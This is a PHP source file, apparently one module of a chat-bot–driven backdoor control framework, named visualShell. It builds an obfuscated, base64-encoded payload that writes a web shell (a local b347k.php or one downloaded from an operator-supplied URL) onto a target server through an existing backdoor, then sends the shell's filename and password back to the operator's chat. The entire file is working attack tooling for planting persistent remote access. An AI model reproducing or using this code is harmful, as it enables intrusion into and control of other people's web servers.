<?php

namespace Modules;

use Classes\GlobalAction;
use System\Backdoors\Backdoor;
use Database\Database;
use System\Configuration;

class visualShell extends Module
{
    public function __construct($chat_id = null)
    {
        if($chat_id === null)
            die();
        $this->chat_id = $chat_id;
        $this->setConfiguration();
        $this->addField('fileUrl','optional');
    }

    public function run()
    {
        $information = Database::getCurrentBackdoorInformation(Database::backdoor_selected());
        if(empty($this->getOneField('fileUrl')))
        {
            if($information !== false)
            {
                $original = str_shuffle('AZERTYIOPQSDGKLMWXCVBN?azeiopqsdfghklmwxcvbn');
                $name = substr($original,0,3);
                $name = trim($name);
                $password = substr($original, 4,5);
                $content_visual_shell = file_get_contents($this->configuration->structure->output_folder.'/b347k.php');
                $content_visual_shell = str_replace('{{PASSWORD_GSHARK}}',sha1(md5($password)), $content_visual_shell);
                $template = '$file = fopen("'.$name.'.php","a+");fwrite($file,base64_decode("'.base64_encode($content_visual_shell).'"));fclose($file);echo "Visual as been upload at".__DIR__."/'.$name.'.php";';
                $this->payload = base64_encode($template);
                $results = GlobalAction::sendPost($information->backdoor_url,['c' => $this->payload]);
                if(empty(trim($results)))
                {
                    GlobalAction::sendMessage('Status: *unknown*', $this->chat_id);
                    GlobalAction::sendMessage('Executed but no result', $this->chat_id);
                }
                else
                {
                  GlobalAction::sendMessage('*Status:* success', $this->chat_id);
                  GlobalAction::sendMessage('*Filename:* _'.trim($results).'_', $this->chat_id);
                  GlobalAction::sendMessage('*Password:* _'.trim($password).'_', $this->chat_id);
                }
                return true;
            }
            else
            {
                GlobalAction::moduleMessage('Can\'t load current target information', $this->chat_id);
                return false;
            }
        }
        else
        {
            if($information !== false)
            {
                $ret = GlobalAction::pingURL($this->getOneField('fileUrl'));
                if($ret)
                {
                    $original = str_shuffle('AZERTYIOPQSDGKLMWXCVBN?azeiopqsdfghklmwxcvbn');
                    $name = substr($original,0,3);
                    $name = trim($name);
                    $content_visual_shell = file_get_contents($this->getOneField('fileUrl'));
                    $template = '$file = fopen("'.$name.'.php","a+");fwrite($file,base64_decode("'.base64_encode($content_visual_shell).'"));fclose($file);echo "Visual as been upload at".__DIR__."/'.$name.'.php";';
                    $this->payload = base64_encode($template);
                    $results = GlobalAction::sendPost($information->backdoor_url,['c' => $this->payload]);
                    if(empty(trim($results)))
                    {
                        GlobalAction::sendMessage('Status: *unknown*', $this->chat_id);
                        GlobalAction::sendMessage('Executed but no result', $this->chat_id);
                    }
                    else
                    {
                        GlobalAction::sendMessage('*Status:* success', $this->chat_id);
                        GlobalAction::sendMessage('*Filename:* _'.trim($results).'_', $this->chat_id);
                    }
                    return true;

                }
                else
                {
                    GlobalAction::moduleMessage('Url seem be down.', $this->chat_id);
                    return false;
                }
            }
        }
    }

}